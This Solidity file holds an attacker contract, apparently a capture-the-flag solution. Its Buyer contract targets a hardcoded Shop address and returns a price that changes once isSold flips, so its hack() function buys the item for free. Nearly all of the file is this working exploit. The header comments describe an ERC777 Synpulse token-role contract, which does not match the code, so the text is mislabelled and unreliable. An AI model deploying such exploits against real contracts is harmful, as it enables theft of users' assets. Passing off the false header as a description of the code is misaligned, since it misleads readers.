// SPDX-License-Identifier: MIT
// This contract was adapted from the ERC777 standard contract and deployed by : Janis M. Heibel, Roy Hove and Adil Anees on behalf of Synpulse.
// This following piece of code complements synpulseTokenGlobal contract. 
// It specifies the roles as well as the on / off function of the overall token contract.

pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Buyer {
    address _addr = 0xe8Ce8416b2356899D59A6B06d39BDc19C9e50492;
    Shop shop = Shop(_addr);

    function price() external view returns (uint) {
        if (!shop.isSold()) {
            return 100;
        } else {
            return 0;
        }
    }

    function hack() public {
        shop.buy();
    }
}